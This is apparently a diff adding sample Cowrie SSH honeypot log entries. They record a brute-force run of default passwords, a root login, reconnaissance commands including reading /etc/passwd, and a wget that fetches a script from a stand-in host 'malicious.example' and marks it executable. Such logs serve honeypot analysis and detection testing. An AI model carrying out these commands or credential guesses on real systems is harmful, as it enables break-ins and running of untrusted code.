@@ -1,0 +1,14 @@
+{"timestamp": "2026-03-05T04:00:00Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "root", "password": "123456", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:03Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "admin", "password": "password", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:06Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "root", "password": "admin", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:09Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "user", "password": "root", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:12Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "ubuntu", "password": "123456", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:15Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "admin", "password": "password", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:18Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "test", "password": "admin", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:21Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.42", "username": "root", "password": "root", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:30Z", "eventid": "cowrie.login.success", "src_ip": "203.0.113.42", "username": "root", "password": "123456", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:35Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "username": "root", "input": "uname -a", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:37Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "username": "root", "input": "whoami", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:39Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "username": "root", "input": "cat /etc/passwd", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:41Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "username": "root", "input": "wget http://malicious.example/x.sh", "session": "abc123def456"}
+{"timestamp": "2026-03-05T04:00:43Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.42", "username": "root", "input": "chmod +x x.sh", "session": "abc123def456"}
